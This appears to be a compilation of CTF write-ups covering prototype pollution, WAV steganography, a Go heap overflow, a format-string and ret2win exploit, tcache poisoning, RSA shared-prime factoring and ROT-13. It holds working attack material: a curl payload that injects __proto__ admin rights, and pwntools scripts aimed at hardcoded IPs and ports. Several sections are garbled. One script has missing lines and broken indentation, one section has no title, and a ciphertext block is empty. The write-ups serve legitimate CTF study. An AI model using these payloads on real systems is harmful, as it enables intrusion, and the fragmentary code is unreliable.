ProfileHub

Web Prototype Pollution WASM Bypass
ProfileHub features a client-side WASM validator and an /api/merge endpoint that deep-merges user-supplied JSON objects. The challenge claims its frontend validator makes backend attacks impossible. The goal is to access the /admin page and retrieve the flag, which is restricted to admins only.
STEP 01

Understanding the Application

The WASM validator only runs in the browser and merely checks that the input is printable ASCII. The real vulnerability lies server-side: the /api/merge endpoint deep-merges two user-supplied JSON objects and returns the result. If the merge function is NOT safe, classic prototype pollution is possible by injecting properties into the prototype chain using the __proto__ key.

STEP 02

Exploiting Prototype Pollution

By sending a JSON payload with a __proto__ key, it is possible to grant admin rights to the session:

bash
curl -s -X POST 'http://chall-1fc1c215.evt-207.glabs.ctf7.com/api/merge' \
  -H 'Content-Type: application/json' \
  --data '{"base":{},"override":{"__proto__":{"isAdmin":true}}}'
STEP 03

Accessing the Admin Panel

If the backend is vulnerable, admin checks like if (user.isAdmin) will now pass for the session. Access the /admin page:

bash
curl -s 'http://chall-1fc1c215.evt-207.glabs.ctf7.com/admin'

This page contains a script which loads the flag by fetching /api/profile.

STEP 04

Retrieving the Flag

bash
curl -s 'http://chall-1fc1c215.evt-207.glabs.ctf7.com/api/profile'
json — response
{
  "role": "admin",
  "message": "Welcome, administrator.",
  "flag": "ctf7{w4sm_pr0t0_p0llut10n_ch41n_29367265}"
}
This attack works because the backend deep merge function fails to sanitize dangerous keys like __proto__. By polluting the global prototype, all user objects now behave as admins, unlocking the /admin panel and flag. The WASM guard is useless — it runs only in the browser and cannot protect the server. Never trust client-side sanitization and never deep merge untrusted objects in Node.js!

Suspicious Transmission

Steganography Audio LSB Python
The provided challenge.wav file appears to be a standard 440 Hz tone. Based on the challenge description, a hidden message was suspected to be concealed within the audio data using LSB (Least Significant Bit) steganography.
METHODOLOGY

How LSB Audio Steganography Works

In audio steganography, data is often hidden by modifying the least significant bits of each PCM sample. By analyzing the 16-bit PCM structure, it is possible to extract these bits sequentially to reconstruct the null-terminated flag.

STEP 01

Python Extraction Script

A Python script was developed to iterate through the WAV frames and extract the LSB from each sample to recover the plaintext message:

python
import struct
import wave

def extract_lsb_message(path):
    with wave.open(path, "rb") as wf:
        n_frames = wf.getnframes()
        raw = wf.readframes(n_frames)
        samples = struct.unpack(f"<{n_frames}h", raw)
    bits = [s & 1 for s in samples]
    out = []
    for i in range(0, len(bits), 8):
        byte = 0
        for b in bits[i:i+8]:
            byte = (byte << 1) | b
        if byte == 0: break
        out.append(chr(byte))
    return "".join(out)

print(extract_lsb_message("challenge.wav"))

Dojo Scrolls

Pwn Heap Overflow Go Binary
A remote Go binary implements a simple note-taking app with 4 operations: create note, edit note, show note, and exit. Notes are allocated on the heap and the edit function does not reallocate when the new size exceeds the original — a classic heap buffer overflow. The challenge hint: "when a scroll outgrows its space, the ink bleeds onto the next."
RECON

Identifying the Language & Architecture

Triggering a crash by showing or editing a non-existent note gives us a Go stack trace:

output
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x4 pc=0x4868bd]

goroutine 1 [running]:
main.main()
        /chall/main.go:117 +0x8fd

Show crashes at addr=0x4 (accessing a field at offset 4 of a nil pointer); Edit crashes at addr=0x0 (offset 0). This tells us the internal Note struct is likely:

go
type Note struct {
    Size int32          // offset 0x0
    Data unsafe.Pointer // offset 0x4
}
ANALYSIS

Understanding the Vulnerability

The edit function accepts a new size and new data but does not reallocate the underlying buffer. If the new size exceeds the original allocation, the write overflows into adjacent heap memory — corrupting the neighboring note's metadata (its "seal").
STRATEGY

Exploitation Plan

1. Create two notes in the same heap size class so their buffers are adjacent.
2. Edit note[0] with a size much larger than originally allocated.
3. The overflow corrupts note[1]'s metadata (the "seal").
4. Show note[1] — the program detects corruption and reveals the flag.

EXPLOIT

Exploit Script

HOST = '138.199.174.108'
PORT = 1337

def create(io, idx, size, data):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', str(size).encode())
    io.sendlineafter(b':', data)

def edit(io, idx, size, data):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b':', str(idx).encode())
    io.sendlineafter(b':', str(size).encode())
    io.sendlineafter(b':', data)

def show(io, idx):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b':', str(idx).encode())
    return io.recvline()

io = remote(HOST, PORT)
io.recvuntil(b'4) Exit')

# Step 1: Create two adjacent notes (same size class)
create(io, 0, 24, b'A' * 8)
create(io, 1, 24, b'B' * 8)

# Step 2: Overflow note[0] into note[1]'s metadata
edit(io, 0, 200, b'X' * 200)

# Step 3: Show corrupted note → flag is revealed

io.interactive()  # Flag drops here

Greeting Service

Pwn Format String Stack Canary Bypass PIE Bypass
A binary that asks for a greeting format and a name. All modern mitigations are enabled: NX, Stack Canaries, PIE, and Full RELRO. A secret_function exists at offset 0x269 from the PIE base. The goal is to chain a format string info-leak with a buffer overflow to redirect execution there.
MITIGATIONS

Security Protections in Place

MitigationStatusImplication
NXEnabledCannot run shellcode on the stack
Stack CanaryEnabledPrevents standard buffer overflows
PIEEnabledMemory addresses randomize on every run
Full RELROEnabledGOT is read-only; cannot hijack GOT entries
STEP 01

Vulnerability Discovery

The program takes two consecutive inputs: a greeting format (reflected back), and a name (then exits). Feeding format specifiers like %p %p %p into the first prompt leaks raw hex values from the stack, confirming a Format String Vulnerability. Because the program then asks for a name and exits, this implies a secondary Buffer Overflow vulnerability.

STEP 02

Leaking the Canary and PIE Base

Using direct parameter access with format specifiers, two critical stack positions were identified:

format specifiers
%9$p   → Stack Canary (identifiable by trailing 00 byte)
%11$p  → Saved Return Address / RIP (used to bypass PIE)

Since PIE randomizes the base but keeps page offsets static, the leaked return address always ended in 0x39c. Subtracting this offset gives the PIE base:

calculation
pie_base       = leaked_rip - 0x39c
secret_function = pie_base + 0x269
STEP 03

Bypassing the movaps Alignment Issue

A standard ret2win payload caused an unexpected crash. Because the return address was hijacked via buffer overflow (bypassing the normal call instruction), the stack pointer (RSP) became misaligned by 8 bytes. When secret_function tried to call system(), it hit a movaps instruction, which requires strict 16-byte stack alignment.

The Fix: Adding +1 to the target address forces the CPU to skip the push rbp instruction at the function's prologue — intentionally misaligning the stack by 8 bytes to perfectly cancel out our previous misalignment.
STEP 04

Buffer Overflow & Final Payload

Through dynamic testing, the exact distance from the name input buffer to the stack canary is 72 bytes. The final payload structure:

payload layout
[72 bytes of junk] + [leaked canary] + [8 bytes for RBP] + [secret_function + 1]
EXPLOIT

Full Exploit Script

python
from pwn import *

HOST = '212.2.250.33'
PORT = 31379

    p = remote(HOST, PORT)

    leaked_rip = int(response[2], 16)

    secret_function = pie_base + 0x269

    log.success(f"Target secret_function:   {hex(secret_function)}")

    # PHASE 2: Stack Smashing & Alignment Bypass
    # +1 skips 'push rbp' to fix Ubuntu movaps alignment crash

    log.info("Sending malicious payload...")

    p.sendline(b"cat flag.txt; cat flag")
    p.interactive()

There is a subtle off-by-one in the edit (append) operation — one byte too many lets us corrupt the tcache freelist pointer, enabling arbitrary write and code execution.
STEP 01

Address Leaks from Banner

On connection, the service prints three critical addresses that would normally require an info leak to obtain:

output
heap @ 0x...
win()  @ 0x...
hook   @ 0x...

The client parses these with regex and stores them as heap_addr, win_addr, and hook_addr.

STEP 02

tcache Poisoning Strategy

Three notes (n0, n1, n2) of equal size (0x20) are created so they occupy adjacent heap chunks. n2 and n1 are then freed in order, placing them on the tcache freelist in LIFO order (n1 on top). The off-by-one in edit lets us overwrite exactly one byte past the end of n0's buffer — which is the start of n1's freed chunk header, allowing corruption of the tcache next-pointer.

python
n0, _     = client.create(NOTE_LEN, b"A" * (NOTE_LEN - 1))
n1, n1_addr = client.create(NOTE_LEN, b"B")
n2, _     = client.create(NOTE_LEN, b"C")

client.delete(n2)
client.delete(n1)  # n1 now on top of tcache freelist
STEP 03

Poisoning the Freelist

The make_poison function builds a payload that overwrites the tcache next-pointer of the freed n1 chunk with a safe-linked encoded pointer to hook_addr:

OVERWRITE_AT = 17  # byte offset where the next-ptr begins

def make_poison(target: int, freed_chunk: int) -> bytes:
    encoded_target = target ^ (freed_chunk >> 12)  # safe-link encoding
    trailer = p64(encoded_target)
    head = b"P" * OVERWRITE_AT
    tail = b"Q" * (NOTE_LEN - OVERWRITE_AT - len(trailer))
    return head + trailer + tail

poison = make_poison(client.hook_addr, n1_addr)

STEP 04

Arbitrary Write & Flag

Two more allocations drain the poisoned tcache. The second allocation lands at hook_addr, and its content is set to win_addr — writing the win function pointer into the hook. A final print_note triggers the hook and outputs the flag.

client.create(NOTE_LEN, b"D")                        # drains n1 slot
_, landed = client.create(NOTE_LEN, p64(client.win_addr))  # lands at hook

KEY INSIGHT

Shared Prime Factor

RSA security relies on the difficulty of factoring a modulus n = p × q. If two independent moduli accidentally share one prime, that prime is trivially recoverable:

insight
gcd(n1, n2) = p  ← shared prime revealed instantly

Once p is known, the private key for n1 can be fully reconstructed.

Recover the Shared Prime

python
from math import gcd
p = gcd(n1, n2)
STEP 02

Reconstruct the Private Key

python
q1  = n1 // p
phi = (p - 1) * (q1 - 1)
d   = pow(e, -1, phi)
STEP 03

Decrypt the Ciphertext

python
m = pow(ciphertext, d, n1)
# Convert integer to bytes to get the flag

Large-scale internet key surveys (e.g. the 2012 "Mining Your Ps and Qs" paper) found thousands of real public keys with shared primes, all instantly factorable. The fix is simple: use a cryptographically secure RNG for prime generation and never share entropy between key generation sessions. This challenge is a textbook demonstration of why RSA key generation quality matters as much as key size.

Rot-13 Decryptor

Crypto ROT-13 Caesar Cipher
The spy's final transmission was garbled with a simple shift cipher. The ciphertext uses ROT-13 — a Caesar cipher with a shift of 13. Since the alphabet has 26 letters, ROT-13 is its own inverse: applying it twice returns the original text.
CIPHERTEXT

Intercepted Transmission

ciphertext

KEY INSIGHT

ROT-13 is Self-Inverse

ROT-13 shifts each letter by 13 positions in the alphabet. Because 13 + 13 = 26 (a full cycle), decrypting ROT-13 is identical to encrypting it — just apply the same shift again. Non-alphabetic characters like digits, underscores, and braces are left unchanged.

mapping (selected chars)
p→c  g→t  s→f  7→7  {→{  G→T  u→h  v→i  f→s  _→_
v→i  f→s  _→_  u→h  b→o  y→l  r→e  _→_  c→p  e→r  b→o  b→o  f→s  }
STEP 01

Apply ROT-13

Using Python's built-in codec or the tr command:

python
import codecs
codecs.decode('pgs7{Guvf_vf_ubyr_cebbs}', 'rot_13')
# → ctf7{This_is_hole_proof}
bash
echo "pgs7{Guvf_vf_ubyr_cebbs}" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
ROT-13 provides zero cryptographic security — it is trivially reversible and was historically used only to obscure spoilers on Usenet, not to protect sensitive data. The dead giveaway in CTFs is that the flag format prefix shifts predictably: pgs7{ → ctf7{, immediately confirming ROT-13 before any full decode is needed.
